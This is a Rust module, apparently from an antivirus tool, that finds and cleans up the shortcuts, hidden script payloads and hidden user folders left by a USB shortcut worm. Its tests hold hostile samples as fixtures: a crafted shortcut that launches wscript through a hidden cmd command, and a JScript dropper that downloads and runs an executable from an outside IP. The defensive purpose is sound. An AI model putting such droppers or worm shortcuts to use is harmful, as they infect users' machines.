//! USB worm clean-up (ADR 0004, 4b): the layout a shortcut worm leaves at the root of a stick,
//! and what to undo.
//!
//! The worm moves or hides the user's folders and files (Hidden + System, often inside one folder
//! with a blank or `_` name), copies itself into a hidden place, and puts shortcuts with the
//! folders' names at the root that start the worm and then open the real folder. Users think their
//! data is gone. Cleaning means: quarantine the shortcuts and the worm's files, and show the real
//! items again. Nothing is deleted, nothing is renamed, and every change is in the journal.
//!
//! Evidence comes first: without at least one shortcut at the root that the scanner flags (it
//! starts a script host with hidden or long commands), nothing is unhidden.

use genra_av_core::reputation::Reputation;
use genra_av_core::rules::{Pack, Severity};
use std::path::{Path, PathBuf};

/// Items Windows and macOS keep hidden at a drive's root on purpose: never unhidden.
const RESERVED: &[&str] = &[
    "system volume information", "$recycle.bin", "recycler", "recycled", "autorun.inf", "desktop.ini", "thumbs.db",
    "indexervolumeguid", "wpsettings.dat", ".trashes", ".spotlight-v100", ".fseventsd", ".ds_store", ".temporaryitems",
];
/// How deep the worm's own files are looked for inside hidden folders.
const PAYLOAD_DEPTH: usize = 3;
/// Most files read while looking for the worm's own files on one stick.
const PAYLOAD_FILES: usize = 2_000;

#[derive(Debug, Default, PartialEq, Eq)]
pub struct WormLayout {
    /// Shortcuts at the root that start the worm: (path, sha256).
    pub shortcuts: Vec<(PathBuf, String)>,
    /// The worm's own files in hidden places that the scanner flags: (path, sha256).
    pub payload: Vec<(PathBuf, String)>,
    /// The user's items the worm hid, to show again (root items, and the items directly inside a
    /// hidden folder with a blank or `_`-only name, where some worms move everything).
    pub hidden: Vec<PathBuf>,
}

impl WormLayout {
    pub fn is_empty(&self) -> bool {
        self.shortcuts.is_empty()
    }
}

fn reserved(p: &Path) -> bool {
    p.file_name().map(|n| n.to_string_lossy().to_lowercase()).is_some_and(|n| RESERVED.contains(&n.as_str()))
}

/// A folder name that reads as nothing: spaces, no-break spaces, underscores or dots only.
fn blank_name(p: &Path) -> bool {
    p.file_name().map(|n| n.to_string_lossy().chars().all(|c| c.is_whitespace() || matches!(c, '\u{00A0}' | '_' | '.' | '\u{3000}'))).unwrap_or(false)
}

fn scan_file(path: &Path, pack: Option<&Pack>, reputation: Option<&Reputation>) -> Option<(String, bool)> {
    let md = std::fs::symlink_metadata(path).ok()?;
    if !md.is_file() || md.len() > genra_av_core::scanner::MAX_FILE {
        return None;
    }
    let bytes = std::fs::read(path).ok()?;
    let name = path.file_name()?.to_string_lossy().into_owned();
    let r = genra_av_core::scan_named(&name, &bytes, pack, reputation);
    Some((r.sha256.clone(), r.verdict.is_some_and(|v| v >= Severity::Suspicious)))
}

/// Reads the layout at `root` (a removable drive), with `is_hidden` telling which items are
/// hidden (Windows attributes in production, a fixed set in tests).
pub fn layout_with(root: &Path, pack: Option<&Pack>, reputation: Option<&Reputation>, is_hidden: impl Fn(&Path) -> bool) -> WormLayout {
    let mut out = WormLayout::default();
    let Ok(rd) = std::fs::read_dir(root) else { return out };
    let mut entries: Vec<PathBuf> = rd.flatten().map(|e| e.path()).collect();
    entries.sort();
    for p in &entries {
        let is_lnk = p.extension().is_some_and(|e| e.eq_ignore_ascii_case("lnk"));
        if is_lnk && std::fs::symlink_metadata(p).is_ok_and(|m| m.is_file()) {
            if let Some((sha, bad)) = scan_file(p, pack, reputation) {
                if bad {
                    out.shortcuts.push((p.clone(), sha));
                }
            }
        }
    }
    if out.shortcuts.is_empty() {
        return out; // No worm shortcut: hidden items are the user's own business.
    }
    let mut budget = PAYLOAD_FILES;
    for p in &entries {
        if reserved(p) || !is_hidden(p) {
            continue;
        }
        let dir = std::fs::symlink_metadata(p).is_ok_and(|m| m.is_dir());
        if !dir {
            match scan_file(p, pack, reputation) {
                Some((sha, true)) => out.payload.push((p.clone(), sha)),
                _ => out.hidden.push(p.clone()),
            }
            continue;
        }
        find_payload(p, 1, pack, reputation, &mut budget, &mut out.payload);
        out.hidden.push(p.clone());
        if blank_name(p) {
            if let Ok(inner) = std::fs::read_dir(p) {
                let mut inner: Vec<PathBuf> = inner.flatten().map(|e| e.path()).filter(|q| is_hidden(q) && !reserved(q)).collect();
                inner.sort();
                out.hidden.extend(inner.into_iter().filter(|q| !out.payload.iter().any(|(x, _)| x == q)));
            }
        }
    }
    out
}

fn find_payload(dir: &Path, depth: usize, pack: Option<&Pack>, reputation: Option<&Reputation>, budget: &mut usize, out: &mut Vec<(PathBuf, String)>) {
    let Ok(rd) = std::fs::read_dir(dir) else { return };
    let mut items: Vec<PathBuf> = rd.flatten().map(|e| e.path()).collect();
    items.sort();
    for p in items {
        if *budget == 0 {
            return;
        }
        let Ok(md) = std::fs::symlink_metadata(&p) else { continue };
        if md.is_dir() {
            if depth < PAYLOAD_DEPTH {
                find_payload(&p, depth + 1, pack, reputation, budget, out);
            }
        } else if md.is_file() {
            *budget -= 1;
            if let Some((sha, true)) = scan_file(&p, pack, reputation) {
                out.push((p, sha));
            }
        }
    }
}

/// The layout on a real drive: hidden means the Hidden or System attribute (Windows only;
/// elsewhere nothing reads as hidden, so only the worm's shortcuts and files are found).
pub fn layout(root: &Path, pack: Option<&Pack>, reputation: Option<&Reputation>) -> WormLayout {
    layout_with(root, pack, reputation, |p| crate::attrs::get(p).is_ok_and(|a| a & (crate::attrs::HIDDEN | crate::attrs::SYSTEM) != 0))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A shortcut that runs cmd with a long hidden command, as USB worms make.
    fn worm_lnk() -> Vec<u8> {
        let mut b = vec![0x4C, 0, 0, 0, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46];
        b.extend((0x08u32 | 0x20 | 0x80).to_le_bytes());
        b.resize(76, 0);
        for s in ["..\\..\\..\\Windows\\System32\\cmd.exe", &format!("/c start wscript /e:vbs \"_\\x.dat\" & start explorer \"Tai lieu\" {}", "&".repeat(400))] {
            let u: Vec<u16> = s.encode_utf16().collect();
            b.extend((u.len() as u16).to_le_bytes());
            for c in u {
                b.extend(c.to_le_bytes());
            }
        }
        b
    }

    fn tmp(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("genra-usb-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    const DROPPER: &[u8] = br#"var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","http://203.0.113.9/a.exe");WScript.CreateObject("WScript.Shell").Run("a.exe");"#;

    #[test]
    fn finds_the_shortcuts_the_payload_and_what_to_show_again() {
        let root = tmp("worm");
        std::fs::create_dir_all(root.join("Tai lieu")).unwrap();
        std::fs::write(root.join("Tai lieu").join("bao-cao.docx"), b"PK").unwrap();
        std::fs::create_dir_all(root.join("_")).unwrap();
        std::fs::write(root.join("_").join("x.js"), DROPPER).unwrap();
        std::fs::create_dir_all(root.join("System Volume Information")).unwrap();
        std::fs::write(root.join("Tai lieu.lnk"), worm_lnk()).unwrap();
        std::fs::write(root.join("Hinh anh.lnk"), b"not a shortcut").unwrap();
        let hidden = |p: &Path| ["Tai lieu", "_", "System Volume Information"].iter().any(|n| p.file_name().is_some_and(|f| f == *n));
        let l = layout_with(&root, None, None, hidden);
        assert_eq!(l.shortcuts.iter().map(|(p, _)| p.file_name().unwrap().to_string_lossy().into_owned()).collect::<Vec<_>>(), ["Tai lieu.lnk"]);
        assert_eq!(l.payload.len(), 1, "the worm's script in the hidden folder");
        assert!(l.payload[0].0.ends_with("_/x.js") || l.payload[0].0.ends_with("_\\x.js"));
        let shown: Vec<String> = l.hidden.iter().map(|p| p.file_name().unwrap().to_string_lossy().into_owned()).collect();
        assert!(shown.contains(&"Tai lieu".to_string()), "{shown:?}");
        assert!(!shown.contains(&"System Volume Information".to_string()), "reserved stays hidden");
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn without_a_worm_shortcut_nothing_is_touched() {
        let root = tmp("clean");
        std::fs::create_dir_all(root.join("Rieng tu")).unwrap();
        std::fs::write(root.join("Zalo.lnk"), b"not a shortcut").unwrap();
        let l = layout_with(&root, None, None, |_| true);
        assert!(l.is_empty() && l.hidden.is_empty(), "a user's own hidden folder is left alone");
        let _ = std::fs::remove_dir_all(&root);
    }

    /// Windows only: real Hidden/System attributes, unhidden through the journal and undone.
    #[cfg(windows)]
    #[test]
    fn unhides_through_the_journal_and_undo_hides_again() {
        use crate::attrs::{get, set, HIDDEN, SYSTEM};
        let root = tmp("attrs");
        let folder = root.join("Tai lieu");
        std::fs::create_dir_all(&folder).unwrap();
        std::fs::write(root.join("Tai lieu.lnk"), worm_lnk()).unwrap();
        set(&folder, get(&folder).unwrap() | HIDDEN | SYSTEM).unwrap();
        let l = layout(&root, None, None);
        assert_eq!(l.hidden, vec![folder.clone()]);
        let data = tmp("attrs-data");
        let mut j = crate::journal::Journal::open(&data).unwrap();
        let g = crate::journal::Journal::new_group_id().unwrap();
        let before = get(&folder).unwrap();
        j.set_attributes(&g, &folder, before & !(HIDDEN | SYSTEM), "hiện", "show").unwrap();
        assert_eq!(get(&folder).unwrap() & (HIDDEN | SYSTEM), 0);
        j.undo_group(&g).unwrap();
        assert_eq!(get(&folder).unwrap() & (HIDDEN | SYSTEM), HIDDEN | SYSTEM);
        let _ = set(&folder, 0);
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&data);
    }
}
